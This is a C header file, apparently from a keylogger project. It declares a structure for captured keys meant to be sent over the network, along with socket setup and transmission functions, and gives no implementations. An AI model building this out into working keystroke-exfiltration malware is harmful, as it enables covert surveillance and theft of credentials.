#pragma once
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#include "keylogger.h"

/**
 * Represents all the data that is sent over the network
 */
typedef struct {
  char** keys;  // an array of strings to be sent over the network
} key_package;

/**
 * Attempt to open an IPv4 TCP socket.
 *
 * Try to create a TCP socket on IPv4, and return the socket descriptor if
 * successful. If creating the socket is not successful, print an error message
 * and exit the program without returning from the function.
 *
 * @return A socket descriptor corresponding to the new socket.
 */
void open_server(void);
/**
 * Attempt to close an open socket.
 *
 * Try to close an existing socket given its descriptor. If closing the socket
 * is not successful, print an error message and exit the program. In the case
 * of an error, this function does not return.
 *
 * @param socket_descriptor The descriptor for the socket to close
 */
void close_server(int socket_descriptor);

/**
 * Return the sockaddr_in corresponding to an address and port.
 *
 * Given an address and port number, convert their representations to network
 * byte order and assemble them into an approopriate sockaddr_in. The returned
 * value can then be used to bind to or connect to a socket.
 *
 * @param addr The address to bind or connect the socket to, in host order.
 * @param port The port number to bind or connect the socket to, in host order.
 * @return A sockaddr_in structure to use with bind/connect, in network order.
 */
struct sockaddr_in socket_address(in_addr_t addr, in_port_t port);

/**
 * Documentation here
 */
void transmit_data(void);

/**
 * Documentation here
 */
void clear_data_queue(void);
